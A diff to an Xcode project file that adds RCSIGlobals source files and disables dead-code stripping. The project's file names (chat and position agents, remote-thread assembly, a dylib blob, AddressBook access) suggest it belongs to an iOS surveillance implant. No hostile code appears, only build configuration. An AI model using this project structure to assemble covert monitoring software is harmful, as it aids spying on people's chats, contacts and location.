@@ -214,6 +214,7 @@
 		52F2B80C14F67D6C00AB51B2 /* CoreGraphics.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52682E48149B3FF900CE9ADB /* CoreGraphics.framework */; };
 		52F4769F10D7A11A00776574 /* AddressBook.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52F4769E10D7A11A00776574 /* AddressBook.framework */; };
 		C55C53CE14CECA240034B013 /* AVFoundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C55C53CD14CECA240034B013 /* AVFoundation.framework */; };
+		CC04D34B15E2209A00B12C6D /* RCSIGlobals.m in Sources */ = {isa = PBXBuildFile; fileRef = CC04D34A15E2209A00B12C6D /* RCSIGlobals.m */; };
 		CC1B55DF15C035A800EDD3F4 /* RCSIAgentChat.m in Sources */ = {isa = PBXBuildFile; fileRef = CC1B55DE15C035A800EDD3F4 /* RCSIAgentChat.m */; };
 		CCBEFEAC15B6B02C00951F6D /* RCSIAgentPositionSupport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A19BEB4107C9A300060F679 /* RCSIAgentPositionSupport.m */; };
 /* End PBXBuildFile section */
@@ -476,6 +477,8 @@
 		52F2B80814F67D6C00AB51B2 /* dylib.ios */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = dylib.ios; sourceTree = BUILT_PRODUCTS_DIR; };
 		52F4769E10D7A11A00776574 /* AddressBook.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AddressBook.framework; path = /System/Library/Frameworks/AddressBook.framework; sourceTree = "<absolute>"; };
 		C55C53CD14CECA240034B013 /* AVFoundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AVFoundation.framework; path = Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.3.sdk/System/Library/Frameworks/AVFoundation.framework; sourceTree = DEVELOPER_DIR; };
+		CC04D34915E2209A00B12C6D /* RCSIGlobals.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSIGlobals.h; sourceTree = "<group>"; };
+		CC04D34A15E2209A00B12C6D /* RCSIGlobals.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSIGlobals.m; sourceTree = "<group>"; };
 		CC1B55DD15C035A800EDD3F4 /* RCSIAgentChat.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSIAgentChat.h; sourceTree = "<group>"; };
 		CC1B55DE15C035A800EDD3F4 /* RCSIAgentChat.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSIAgentChat.m; sourceTree = "<group>"; };
 /* End PBXFileReference section */
@@ -597,6 +600,8 @@
 				1AC0E2291056956E00DCFA55 /* RCSIMain.m */,
 				1AC0E2361056966A00DCFA55 /* RCSICore.h */,
 				1AC0E2371056966A00DCFA55 /* RCSICore.m */,
+				CC04D34915E2209A00B12C6D /* RCSIGlobals.h */,
+				CC04D34A15E2209A00B12C6D /* RCSIGlobals.m */,
 				1AC0E22F1056961000DCFA55 /* RCSICommon.h */,
 				1AC0E2301056961000DCFA55 /* RCSICommon.m */,
 				32CA4F630368D1EE00C91783 /* RCSIphone_Prefix.pch */,
@@ -1261,6 +1266,7 @@
 				5220196F1549832D00C4FB66 /* RCSIRemoteThread.s in Sources */,
 				52965493155D580F00AED90A /* RCSIDylibBlob.m in Sources */,
 				CC1B55DF15C035A800EDD3F4 /* RCSIAgentChat.m in Sources */,
+				CC04D34B15E2209A00B12C6D /* RCSIGlobals.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1432,6 +1438,7 @@
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				COPY_PHASE_STRIP = NO;
+				DEAD_CODE_STRIPPING = NO;
 				FRAMEWORK_SEARCH_PATHS = (
 					"$(inherited)",
 					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks\"",
@@ -1475,6 +1482,7 @@
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				COPY_PHASE_STRIP = YES;
+				DEAD_CODE_STRIPPING = NO;
 				FRAMEWORK_SEARCH_PATHS = (
 					"$(inherited)",
 					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks\"",
